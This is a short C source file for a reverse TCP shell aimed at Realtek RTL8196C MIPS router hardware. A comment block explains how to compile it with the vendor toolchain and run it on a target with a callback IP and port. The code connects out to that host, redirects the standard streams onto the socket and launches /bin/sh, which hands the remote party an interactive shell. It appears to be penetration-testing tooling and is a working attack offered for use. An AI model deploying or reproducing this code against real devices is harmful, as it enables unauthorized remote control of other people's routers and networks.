#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

/**
 * Unpack the toolchain:
 * 	$ tar xf rsdk-mips.tar.gz
 *
 * Add the toolchain bin directory to your path.
 * 	$ cd rtl8196c-toolchain-1.1/rsdk-1.3.6-4181-EB-2.4.25-0.9.30/bin/
 *	$ export PATH=$(pwd):$PATH
 *
 * Compile:
 * 	$ cd ../../..
 * 	$ rsdk-linux-gcc -static -o reverse_shell reverse_tcp.c
 *
 * Execute on target:
 * 	./reverse_shell CALLBACK_IP CALLBACK_PORT
 * */

int main(int argc, char **argv)
{
    char *host = argv[1];
    int port = 0;
    int host_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in host_addr;

    port = atoi(argv[2]);

    host_addr.sin_family = AF_INET;
    host_addr.sin_port = htons(port);
    host_addr.sin_addr.s_addr = inet_addr(host);
    
    connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
        
    dup2(host_sock, 0);
    dup2(host_sock, 1);
    dup2(host_sock, 2);
    
    execl("/bin/sh", "/bin/sh", NULL);
}
